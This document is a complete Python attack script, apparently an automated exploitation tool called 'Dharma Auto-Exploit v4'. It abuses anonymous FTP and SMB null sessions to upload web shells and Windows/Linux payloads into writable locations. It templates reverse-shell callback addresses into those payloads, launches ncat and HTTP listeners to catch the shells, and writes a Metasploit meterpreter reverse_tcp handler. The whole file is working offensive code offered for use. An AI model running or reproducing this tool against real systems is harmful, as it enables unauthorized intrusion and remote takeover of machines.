#!/usr/bin/env python3
import os, json, ftplib, argparse, subprocess, glob
from io import BytesIO
from datetime import datetime
from impacket.smbconnection import SMBConnection
from http.server import HTTPServer, BaseHTTPRequestHandler
from threading import Thread

# === HTTP Shell Callback ===
class ShellCatcher(BaseHTTPRequestHandler):
    def do_GET(self):
        print(f"[!] SHELL CALLED BACK: {self.path}")
        self.send_response(200)
        self.end_headers()

def launch_http_listener(port):
    print(f"[+] Starting HTTP shell listener on port {port}")
    server = HTTPServer(("0.0.0.0", port), ShellCatcher)
    server.serve_forever()

def launch_nc_listener(port):
    print(f"[+] Launching Netcat listener on port {port}")
    subprocess.Popen(["ncat", "-lvnp", str(port)])

def write_rc_file(lhost, lport, filename="handlers/meterpreter.rc"):
    os.makedirs("handlers", exist_ok=True)
    with open(filename, "w") as f:
        f.write(f"""use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST {lhost}
set LPORT {lport}
exploit -j
""")
    print(f"[+] Metasploit handler .rc file written: {filename}")

def load_loot(ip, proto):
    path = f"loot/{proto}-{ip.replace('.', '_')}.json"
    if os.path.exists(path):
        with open(path) as f:
            return json.load(f)
    return None

def save_log(ip, lines):
    log_dir = f"results/{ip}/"
    os.makedirs(log_dir, exist_ok=True)
    with open(f"{log_dir}/exploit-log.txt", "a") as f:
        for line in lines:
            f.write(line + "\n")

# === Payload Auto-Selection ===
def find_payloads_for(proto):
    if proto == "ftp":
        return glob.glob("payloads/web/*.php") + glob.glob("payloads/web/*.asp")
    if proto == "smb":
        return (
            glob.glob("payloads/windows/*.ps1") +
            glob.glob("payloads/windows/*.bat") +
            glob.glob("payloads/linux/*.sh") +
            glob.glob("payloads/linux/*.c")
        )
    return []

def upload_ftp_shell(ftp_loot, ip, callback):
    log = ["[FTP] Exploiting anonymous + writable"]
    if not ftp_loot.get("anonymous_login") or not ftp_loot.get("writable_dirs"):
        return log + ["[!] No FTP writable directories or anonymous access."]

    ftp = ftplib.FTP()
    try:
        ftp.connect(ip, 21, timeout=5)
        ftp.login()
    except Exception as e:
        return log + [f"[!] FTP login failed: {e}"]

    uploaded = []
    for writable_dir in ftp_loot["writable_dirs"]:
        for full_path in find_payloads_for("ftp"):
            fname = os.path.basename(full_path)
            try:
                with open(full_path, "r") as f:
                    raw = f.read()
                    ip_cb, port_cb = callback.split(":") if callback else ("127.0.0.1", "4444")
                    templated = raw.replace("{{CALLBACK}}", callback).replace("{{CALLBACK_IP}}", ip_cb).replace("{{CALLBACK_PORT}}", port_cb)
                    ftp.cwd(writable_dir)
                    ftp.storbinary(f"STOR {fname}", BytesIO(templated.encode()))
                    url = f"http://{ip}/{writable_dir}/{fname}"
                    uploaded.append(url)
                    log.append(f"[+] Uploaded: {fname} â†’ /{writable_dir}")
            except Exception as e:
                log.append(f"[!] Upload failed: {e}")

    ftp.quit()

    if uploaded:
        log.append("\n[+] Suggested Trigger URLs:")
        for url in uploaded:
            log.append(f"    - {url}?cmd=whoami or beacon")
    else:
        log.append("[!] No FTP payloads uploaded.")
    return log

def upload_smb_shell(smb_loot, ip, callback):
    log = ["[SMB] Attempting null session + writable drop"]
    try:
        smb = SMBConnection(ip, ip, sess_port=445, timeout=5)
        smb.login("", "")
    except Exception as e:
        return log + [f"[!] SMB login failed: {e}"]

    uploaded = []
    for share in smb_loot.get("shares", []):
        if share["access"] == "WRITE":
            for full_path in find_payloads_for("smb"):
                fname = os.path.basename(full_path)
                try:
                    with open(full_path, "r") as f:
                        raw = f.read()
                        ip_cb, port_cb = callback.split(":") if callback else ("127.0.0.1", "4444")
                        templated = raw.replace("{{CALLBACK}}", callback).replace("{{CALLBACK_IP}}", ip_cb).replace("{{CALLBACK_PORT}}", port_cb)
                        data = templated.encode()
                        smb.putFile(share["name"], f"\\{fname}", lambda x: x.write(data))
                        uploaded.append((share["name"], fname))
                        log.append(f"[+] Uploaded {fname} to \\\\{ip}\\{share['name']}")
                except Exception as e:
                    log.append(f"[!] SMB upload failed: {e}")

    if uploaded:
        log.append("\n[+] Suggested Triggers:")
        for share, fname in uploaded:
            log.append(f"    - Manual exec: \\\\{ip}\\{share}\\{fname}")
    else:
        log.append("[!] No SMB payloads uploaded.")
    return log

def auto_exploit(ip, callback, listen, http_listen, generate_rc):
    print(f"\n[+] Auto-Exploitation for {ip}")

    if listen and callback:
        port = int(callback.split(":")[1])
        launch_nc_listener(port)

    if http_listen and callback:
        port = int(callback.split(":")[1])
        thread = Thread(target=launch_http_listener, args=(port,))
        thread.daemon = True
        thread.start()

    if generate_rc and callback:
        ip_cb, port_cb = callback.split(":")
        write_rc_file(ip_cb, port_cb)

    results = []

    ftp_loot = load_loot(ip, "ftp")
    if ftp_loot:
        print("[*] FTP loot found")
        results += upload_ftp_shell(ftp_loot, ip, callback)

    smb_loot = load_loot(ip, "smb")
    if smb_loot:
        print("[*] SMB loot found")
        results += upload_smb_shell(smb_loot, ip, callback)

    if results:
        save_log(ip, results)
        print("\n".join(results))
        print(f"\n[+] Exploit log saved to results/{ip}/exploit-log.txt")
    else:
        print("[-] No exploits performed.")

# === Entrypoint ===
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Dharma Auto-Exploit v4 with Smart Payload Routing")
    parser.add_argument("--target", required=True, help="Target IP")
    parser.add_argument("--callback", help="Callback IP:PORT (e.g. 10.10.14.3:4444)")
    parser.add_argument("--listen", action="store_true", help="Launch Netcat listener")
    parser.add_argument("--http-listen", action="store_true", help="Start HTTP beacon catcher")
    parser.add_argument("--generate-rc", action="store_true", help="Write Metasploit .rc file")

    args = parser.parse_args()
    auto_exploit(
        ip=args.target,
        callback=args.callback,
        listen=args.listen,
        http_listen=args.http_listen,
        generate_rc=args.generate_rc
    )

